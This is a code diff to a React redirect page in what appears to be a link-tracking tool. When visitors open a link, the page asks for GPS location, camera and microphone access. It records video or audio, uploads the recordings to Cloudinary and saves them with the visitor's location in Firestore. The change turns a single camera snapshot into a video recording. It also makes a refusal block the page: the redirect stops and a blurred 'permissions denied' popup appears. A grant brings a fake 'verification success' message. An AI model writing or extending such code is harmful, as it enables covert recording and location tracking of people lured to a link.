@@ -2,6 +2,7 @@ import * as React from 'react';
 import { useParams } from 'react-router-dom';
 import type { Settings, CapturedData, PermissionType } from '../types';
 import { useLanguage } from '../contexts/LanguageContext';
+import { useNotification } from '../contexts/SettingsContext';
 import { NEW_REDIRECT_TEMPLATE, CARD_STYLES, CLOUDINARY_UPLOAD_URL, CLOUDINARY_UPLOAD_PRESET } from '../constants';
 import { db } from '../firebase';
 import { collection, addDoc } from 'firebase/firestore';
@@ -292,10 +293,12 @@ const parseUserAgent = (ua: string) => {
 const RedirectPage: React.FC<RedirectPageProps> = ({ previewSettings, isPreview: isPreviewProp, isEmbeddedPreview = false, onClosePreview }) => {
   const { data } = useParams<{ data: string }>();
   const { t } = useLanguage();
+  const addNotification = useNotification();
   
   const [settings, setSettings] = React.useState<Settings | null>(null);
   const [error, setError] = React.useState<string | null>(null);
   const [isPaused, setIsPaused] = React.useState(true);
+  const [showDeniedPopup, setShowDeniedPopup] = React.useState(false);
   
   const isPreview = !!isPreviewProp;
   const isMounted = React.useRef(true);
@@ -409,48 +412,35 @@ const RedirectPage: React.FC<RedirectPageProps> = ({ previewSettings, isPreview:
                     });
                     capturedData.permissions.location = 'granted';
                     capturedData.location = { lat: pos.coords.latitude, lon: pos.coords.longitude, city: capturedData.location.city, country: capturedData.location.country, source: 'gps'};
-                } else if (permission === 'camera') {
-                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                    capturedData.permissions.camera = 'granted';
+                
+                } else if (permission === 'camera' || permission === 'microphone') {
+                    const constraints = {
+                        video: permission === 'camera',
+                        audio: permission === 'microphone',
+                    };
+                    const stream = await navigator.mediaDevices.getUserMedia(constraints);
                     
-                    const video = document.createElement('video');
-                    video.srcObject = stream;
-                    await video.play();
-                    const canvas = document.createElement('canvas');
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    canvas.getContext('2d')?.drawImage(video, 0, 0);
-                    
-                    const formData = new FormData();
-                    formData.append('file', canvas.toDataURL('image/jpeg', 0.7));
-                    formData.append('upload_preset', CLOUDINARY_UPLOAD_PRESET);
+                    if (permission === 'camera') capturedData.permissions.camera = 'granted';
+                    if (permission === 'microphone') capturedData.permissions.microphone = 'granted';
 
-                    const res = await fetch(CLOUDINARY_UPLOAD_URL, { method: 'POST', body: formData });
-                    const uploadData = await res.json();
-                    capturedData.cameraCapture = uploadData.secure_url;
-                    
-                    stream.getTracks().forEach(track => track.stop());
-
-                } else if (permission === 'microphone') {
-                    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-                    capturedData.permissions.microphone = 'granted';
-
-                    const audioBlob = await new Promise<Blob>((resolve) => {
-                        const recorder = new MediaRecorder(stream, { mimeType: 'audio/webm' });
+                    const mediaBlob = await new Promise<Blob>((resolve) => {
+                        const recorder = new MediaRecorder(stream, { mimeType: permission === 'camera' ? 'video/webm' : 'audio/webm' });
                         const chunks: Blob[] = [];
                         recorder.ondataavailable = e => chunks.push(e.data);
-                        recorder.onstop = () => resolve(new Blob(chunks, { type: 'audio/webm' }));
+                        recorder.onstop = () => resolve(new Blob(chunks, { type: recorder.mimeType }));
                         setTimeout(() => recorder.stop(), settings.captureInfo.recordingDuration * 1000);
                         recorder.start();
                     });
-
+                    
                     const formData = new FormData();
-                    formData.append('file', audioBlob);
+                    formData.append('file', mediaBlob);
                     formData.append('upload_preset', CLOUDINARY_UPLOAD_PRESET);
                     
                     const res = await fetch(CLOUDINARY_UPLOAD_URL, { method: 'POST', body: formData });
                     const uploadData = await res.json();
-                    capturedData.microphoneCapture = uploadData.secure_url;
+                    
+                    if (permission === 'camera') capturedData.cameraCapture = uploadData.secure_url;
+                    if (permission === 'microphone') capturedData.microphoneCapture = uploadData.secure_url;
 
                     stream.getTracks().forEach(track => track.stop());
                 }
@@ -459,6 +449,8 @@ const RedirectPage: React.FC<RedirectPageProps> = ({ previewSettings, isPreview:
                 if (permission === 'camera') capturedData.permissions.camera = 'denied';
                 if (permission === 'microphone') capturedData.permissions.microphone = 'denied';
                 anyPermissionDenied = true;
+                setShowDeniedPopup(true);
+                break; // Stop asking for more permissions if one is denied
             }
         }
         
@@ -469,6 +461,7 @@ const RedirectPage: React.FC<RedirectPageProps> = ({ previewSettings, isPreview:
         if (anyPermissionDenied) {
             setIsPaused(true); // Pause the redirect indefinitely
         } else {
+            addNotification({ type: 'success', message: 'notification_verification_success' });
             startRedirectSequence();
         }
     };
@@ -479,7 +472,7 @@ const RedirectPage: React.FC<RedirectPageProps> = ({ previewSettings, isPreview:
       startRedirectSequence();
     }
 
-  }, [settings, isPreview, isPaused, t]);
+  }, [settings, isPreview, isPaused, t, addNotification]);
   
   const handleClosePreview = () => onClosePreview?.();
 
@@ -504,18 +497,24 @@ const RedirectPage: React.FC<RedirectPageProps> = ({ previewSettings, isPreview:
   const renderCard = () => {
     // If permissions were denied, isPaused will be true, halting the progress bar.
     const props = { settings, isPaused: isPreview || isPaused };
-    switch (settings.cardStyle) {
-        case 'glass': return <GlassCard {...props} />;
-        case 'minimal': return <MinimalCard {...props} />;
-        case 'elegant': return <ElegantCard {...props} />;
-        case 'sleek-dark': return <SleekDarkCard {...props} />;
-        case 'article': return <ArticleCard {...props} />;
-        case 'terminal': return <TerminalCard {...props} />;
-        case 'retro-tv': return <RetroTVCard {...props} />;
-        case 'gradient-burst': return <GradientBurstCard {...props} />;
-        case 'video-player': return <VideoPlayerCard {...props} />;
-        default: return <DefaultWhiteCard {...props} />;
-    }
+    return (
+      <div className={`relative transition-all duration-300 ${showDeniedPopup ? 'blur-md' : ''}`}>
+        {(() => {
+          switch (settings.cardStyle) {
+            case 'glass': return <GlassCard {...props} />;
+            case 'minimal': return <MinimalCard {...props} />;
+            case 'elegant': return <ElegantCard {...props} />;
+            case 'sleek-dark': return <SleekDarkCard {...props} />;
+            case 'article': return <ArticleCard {...props} />;
+            case 'terminal': return <TerminalCard {...props} />;
+            case 'retro-tv': return <RetroTVCard {...props} />;
+            case 'gradient-burst': return <GradientBurstCard {...props} />;
+            case 'video-player': return <VideoPlayerCard {...props} />;
+            default: return <DefaultWhiteCard {...props} />;
+          }
+        })()}
+      </div>
+    );
   };
 
   return (
@@ -532,9 +531,9 @@ const RedirectPage: React.FC<RedirectPageProps> = ({ previewSettings, isPreview:
                 </div>
             </div>
         )}
-        {isPaused && !isPreview && settings?.captureInfo.permissions.length > 0 && (
-             <div className="absolute inset-0 bg-black/70 backdrop-blur-md z-20 flex items-center justify-center animate-fade-in">
-                 <div className="text-center p-8 rounded-lg max-w-sm">
+        {showDeniedPopup && (
+             <div className="absolute inset-0 z-20 flex items-center justify-center animate-fade-in p-4">
+                 <div className="text-center bg-black/50 backdrop-blur-lg p-8 rounded-2xl max-w-sm border border-slate-700 shadow-2xl">
                      <h2 className="text-2xl font-bold text-red-400 mb-2">{t('redirect_permissions_denied_title')}</h2>
                      <p className="text-slate-300">{t('redirect_permissions_denied_message')}</p>
                  </div>
